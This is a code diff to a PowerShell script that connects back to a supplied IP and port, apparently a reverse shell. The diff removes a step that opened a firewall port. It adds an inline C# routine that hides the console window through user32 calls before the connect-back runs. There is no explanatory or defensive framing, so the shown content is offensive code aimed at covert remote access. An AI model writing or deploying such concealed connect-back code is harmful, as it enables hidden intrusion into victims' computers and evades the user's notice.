@@ -3,16 +3,35 @@ param (
     [int]$port
 )
 
-function Open-FirewallPort {
-    param (
-        [int]$port
-    )
-    if ($PSVersionTable.PSVersion.Major -ge 5) {
-        Write-Host "Opening port $port in the firewall..."
-        netsh advfirewall firewall add rule name="PowerShellClient" dir=out action=allow protocol=TCP remoteport=$port
-    } else {
-        Write-Host "This script requires PowerShell 5.0 or higher to modify firewall rules."
+# Function to hide the PowerShell window
+function Hide-Window {
+    $code = @"
+using System;
+using System.Runtime.InteropServices;
+
+public class Window {
+    [DllImport("user32.dll")]
+    private static extern IntPtr GetForegroundWindow();
+
+    [DllImport("user32.dll", SetLastError = true)]
+    private static extern int ShowWindow(IntPtr hWnd, uint nCmdShow);
+
+    private const uint SW_HIDE = 0;
+    private const uint SW_SHOW = 5;
+
+    public static void Hide() {
+        IntPtr hWnd = GetForegroundWindow();
+        ShowWindow(hWnd, SW_HIDE);
     }
+
+    public static void Show() {
+        IntPtr hWnd = GetForegroundWindow();
+        ShowWindow(hWnd, SW_SHOW);
+    }
+}
+"@
+    Add-Type -TypeDefinition $code -Language CSharp
+    [Window]::Hide()
 }
 
 function Connect-Back {
@@ -41,5 +60,5 @@ function Connect-Back {
 }
 
 # Main execution
-Open-FirewallPort -port $port
+Hide-Window
 Connect-Back -ip $ip -port $port
